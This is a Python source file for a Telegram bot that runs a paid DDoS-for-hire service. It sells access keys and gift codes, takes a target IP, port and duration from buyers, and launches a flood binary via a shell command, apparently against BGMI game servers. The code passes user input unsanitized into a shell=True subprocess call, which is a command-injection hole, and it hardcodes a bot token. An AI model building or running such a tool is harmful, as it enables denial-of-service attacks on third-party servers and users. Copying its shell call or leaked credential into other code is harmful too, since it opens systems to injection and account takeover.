import os
import re
import threading
import time
import json
import datetime
import subprocess
import random
import string
import logging

from flask import Flask, request, jsonify, Response
import telebot
from telebot import types
from pymongo import MongoClient, ASCENDING, DESCENDING
from pymongo.errors import DuplicateKeyError

# ============================================================
# CONFIGURATION & LOGGING
# ============================================================

logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN", "6400615750:AAHero6NP7UImczIeqmVL76yh4zw2tP893s")
MONGODB_URI = os.environ.get("MONGODB_URI")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set")

if not MONGODB_URI:
    raise ValueError("MONGODB_URI environment variable is not set")

OWNER_ID = "6795305850"
ADMIN_IDS = ["6795305850"]

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# User state & active attack tracking for multi-user safety
user_states = {}
active_attacks = set()
attacks_lock = threading.Lock()

# Flask Health Check Route for Render
@app.route('/')
def index():
    return "R2F Bot is active and running successfully! 🚀", 200

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

# ============================================================
# MONGODB DATABASE SETUP
# ============================================================

try:
    mongo_client = MongoClient(
        MONGODB_URI,
        serverSelectionTimeoutMS=10000,
        connectTimeoutMS=10000,
        socketTimeoutMS=10000,
    )
    mongo_client.admin.command("ping")
    db = mongo_client["r2f_bot_db"]

    users_collection = db["allowed_users"]
    admins_collection = db["admins"]
    credits_collection = db["user_credits"]
    gift_codes_collection = db["gift_codes"]
    key_prices_collection = db["key_prices"]
    logs_collection = db["command_logs"]

    # Create Indexes
    users_collection.create_index([("user_id", ASCENDING)], unique=True)
    gift_codes_collection.create_index([("code", ASCENDING)], unique=True)
    key_prices_collection.create_index([("duration", ASCENDING)], unique=True)

    print("MongoDB connected successfully with Multi-User & Render support!")

except Exception as e:
    raise RuntimeError(f"MongoDB connection failed: {e}")

# Default Key Prices Setup in DB if not present
default_prices = {"day": 200, "week": 900, "month": 1800}
for dur, prc in default_prices.items():
    key_prices_collection.update_one(
        {"duration": dur},
        {"$setOnInsert": {"price": prc}},
        upsert=True
    )

# ============================================================
# KEYBOARDS & MENUS
# ============================================================

def get_main_reply_keyboard():
    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2
    )
    markup.add(
        types.KeyboardButton("⚡ Quick Attack"),
        types.KeyboardButton("💰 Check Balance"),
        types.KeyboardButton("⚠️ Rules"),
        types.KeyboardButton("🛠️ Help")
    )
    return markup

# ============================================================
# HELPER FUNCTIONS (PERMISSION CHECK)
# ============================================================

def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def get_key_price(duration):
    res = key_prices_collection.find_one({"duration": duration})
    return res["price"] if res else default_prices.get(duration, 200)

def is_user_allowed(user_id):
    """Checks if the user is Owner, Admin, or an Approved User with active duration"""
    if str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS:
        return True
    user = users_collection.find_one({"user_id": str(user_id)})
    if user:
        if "expiration" in user and user["expiration"]:
            if datetime.datetime.now() > user["expiration"]:
                return False
        return True
    return False

def log_command_db(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(int(user_id))
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"
    
    logs_collection.insert_one({
        "user_id": str(user_id),
        "username": username,
        "target": target,
        "port": port,
        "duration": duration,
        "timestamp": datetime.datetime.now()
    })

def execute_attack(chat_id, user_id, target, port, attack_time):
    if attack_time > 300:
        bot.send_message(chat_id, "Error: Time interval must be less than 300.")
        with attacks_lock:
            active_attacks.discard(user_id)
        return

    log_command_db(user_id, target, port, attack_time)
    
    start_resp = f"🚀 Attack Started Successfully! 🚀\n\n🗿 𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦 Attack Duration: {attack_time}s\n💣 Method: LODA-LELE\n\n🔥 Status: IN PROGRESS... 🔥"
    bot.send_message(chat_id, start_resp)
    
    full_command = f"./attack {target} {port} {attack_time} 300"
    try:
        subprocess.run(full_command, shell=True, timeout=attack_time + 10)
    except Exception as e:
        logging.error(f"Attack execution error: {e}")
    
    with attacks_lock:
        active_attacks.discard(user_id)
    
    bot.send_message(chat_id, f"BGMI Attack Finished ✅.\nTarget: {target} | Port: {port} | Time: {attack_time}s")

def try_start_attack(chat_id, user_id, target, port, attack_time):
    # Strict Permission Verification
    if not is_user_allowed(user_id):
        bot.send_message(chat_id, "🚫 Unauthorized Access!\n\nAapke paas attack chalane ki permission nahi hai. Kripya Admin ya Owner se contact karein.")
        return

    with attacks_lock:
        if user_id in active_attacks:
            bot.send_message(chat_id, "⚠️ **Rule Violation:** Aapka ek attack pehle se chal raha hai! Dusra attack start karne ke liye pehle wale ke khatam hone ka wait karein.", parse_mode="Markdown")
            return
        active_attacks.add(user_id)
    
    threading.Thread(target=execute_attack, args=(chat_id, user_id, target, port, attack_time), daemon=True).start()

# ============================================================
# TELEGRAM BOT COMMAND HANDLERS
# ============================================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        f"🌟 Welcome to the R2F DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Niche diye gaye buttons ya commands ka use karein:"
    )
    bot.send_message(message.chat.id, response, reply_markup=get_main_reply_keyboard())

@bot.message_handler(commands=['help'])
def send_help(message):
    response = (
        "📜 *Bot Commands List*\n\n"
        "💥 Quick Attack Button - Select time & input IP:Port\n"
        "👤 `/approveuser <id> <duration>` - Approve user (day/week/month)\n"
        "❌ `/removeuser <id>` - Remove authorized user\n"
        "🔑 `/addadmin <id> <balance>` - Add admin\n"
        "💰 `/checkbalance` - Check credits\n"
        "🎁 /redeem <code> - Redeem gift code\n"
        "⚠️ `/rules` - View rules"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# --- QUICK ATTACK MENU HANDLERS ---

@bot.message_handler(func=lambda message: message.text == "⚡ Quick Attack")
def quick_attack_menu(message):
    user_id = str(message.chat.id)
    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "🚫 Unauthorized Access! Contact Admin to buy access.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⏱️ 60 Seconds", callback_data="qa_time_60"),
        types.InlineKeyboardButton("⏱️ 120 Seconds", callback_data="qa_time_120"),
        types.InlineKeyboardButton("⏱️ 180 Seconds", callback_data="qa_time_180"),
        types.InlineKeyboardButton("⏱️ 300 Seconds", callback_data="qa_time_300")
    )
    bot.send_message(
        message.chat.id,
        "⚡ *QUICK ATTACK PANEL*\n\nApna attack duration select karein:",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("qa_time_"))
def quick_attack_time_selected(call):
    user_id = str(call.message.chat.id)
    if not is_user_allowed(user_id):
        bot.answer_callback_query(call.id, "❌ Unauthorized!", show_alert=True)
        return

    duration = int(call.data.replace("qa_time_", ""))
    user_states[user_id] = {"action": "waiting_qa_target", "duration": duration}

    bot.answer_callback_query(call.id, f"Duration: {duration}s selected!")
    bot.edit_message_text(
        f"🎯 *Duration Set:* `{duration} Seconds`\n\n"
        f"Ab apna **Target IP aur Port** ek sath space dekar send karein.\n"
        f"👉 *Example:* `192.168.1.1 80`",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_qa_target")
def process_quick_attack_input(message):
    user_id = str(message.chat.id)
    state = user_states.pop(user_id, None)
    if not state:
        return

    duration = state["duration"]
    parts = message.text.strip().split()

    if len(parts) == 2:
        target = parts[0]
        try:
            port = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid Port number. Dobara try karein.")
            return

        try_start_attack(message.chat.id, user_id, target, port, duration)
    else:
        bot.reply_to(message, "❌ Galat format! Kripya sirf IP aur Port dein (Jaise: `192.168.1.1 80`)", parse_mode="Markdown")

# --- REPLY KEYBOARD TEXT SHORTCUTS ---

@bot.message_handler(func=lambda message: message.text == "💰 Check Balance")
def menu_check_balance(message):
    user_id = str(message.chat.id)
    user_cred = credits_collection.find_one({"user_id": user_id})
    balance = user_cred["balance"] if user_cred else 0
    bot.send_message(message.chat.id, f"Your current balance is {balance} credits 💰.")

@bot.message_handler(func=lambda message: message.text == "⚠️ Rules")
def menu_rules(message):
    response = (
        "⚠️ **Bot Rules:**\n\n"
        "1. Ek waqt par ek hi attack run karein.\n"
        "2. Maximum limit 300 seconds hai."
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🛠️ Help")
def menu_help(message):
    send_help(message)

# --- ADMIN & UTILITY COMMANDS ---

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2].lower()
            if duration not in ["day", "week", "month"]:
                bot.send_message(message.chat.id, "Invalid duration. Use 'day', 'week', or 'month'.")
                return

            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
            
            users_collection.update_one(
                {"user_id": user_to_approve},
                {"$set": {"expiration": expiration_date, "approved_by": user_id}},
                upsert=True
            )
            response = f"User {user_to_approve} approved for {duration} 👍."
        else:
            response = "Usage: /approveuser <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            res = users_collection.delete_one({"user_id": user_to_remove})
            if res.deleted_count > 0:
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in database ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == OWNER_ID:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            if admin_to_add not in ADMIN_IDS:
                ADMIN_IDS.append(admin_to_add)
            
            credits_collection.update_one(
                {"user_id": admin_to_add},
                {"$set": {"balance": balance}},
                upsert=True
            )
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        gift = gift_codes_collection.find_one({"code": code})
        if gift:
            duration = gift["duration"]
            gift_codes_collection.delete_one({"code": code})
            
            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
            
            users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"expiration": expiration_date}},
                upsert=True
            )
            response = f"Gift code redeemed: Granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

# Direct Attack Command Handler (Fallback)
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "🚫 Unauthorized Access! Contact Admin to buy access.")
        return

    command = message.text.split()
    if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
        if not message.text.startswith('/'):
            command = ['/attack'] + command
        target = command[1]
        try:
            port = int(command[2])
            attack_time = int(command[3])
        except ValueError:
            bot.reply_to(message, "Invalid port or time format.")
            return

        try_start_attack(message.chat.id, user_id, target, port, attack_time)
    else:
        response = "Please provide attack format:\n`<host> <port> <time>` or use the **⚡ Quick Attack** menu button."
        bot.send_message(message.chat.id, response, parse_mode="Markdown")

# ============================================================
# RUN BOT & FLASK SERVER CONCURRENTLY
# ============================================================

def run_telegram_bot():
    print("Telegram Bot polling started...")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Bot polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
